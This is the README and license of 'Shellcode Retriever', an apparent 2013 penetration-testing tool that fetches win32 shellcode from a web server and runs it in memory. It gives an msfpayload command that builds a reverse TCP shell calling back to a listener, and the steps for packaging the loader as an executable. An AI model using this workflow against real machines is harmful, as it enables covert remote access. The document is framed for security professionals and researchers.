##Shellcode Retriever
Downloads win32 shellcode from webservers and executes the shellcode without it touching disk (using the following method: http://www.debasish.in/2012_04_01_archive.html)

Demo:

http://www.youtube.com/watch?v=R15B2p-uWKY

---

For use by IT Security professionals and researchers.

Usage:

Create shellcode using the following msfpayload command:

msfpayload windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=8080 EXITFUNC=thread R > test.txt

Notice the exit function, very important if you want the process to run and beacon out based on timeouts in the source code.

Upload the shellcode to your webserver.

Compile the python code to an executeable by using pyinstaller.


---

##License:   GPLv3


    Shellcode Retriever

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.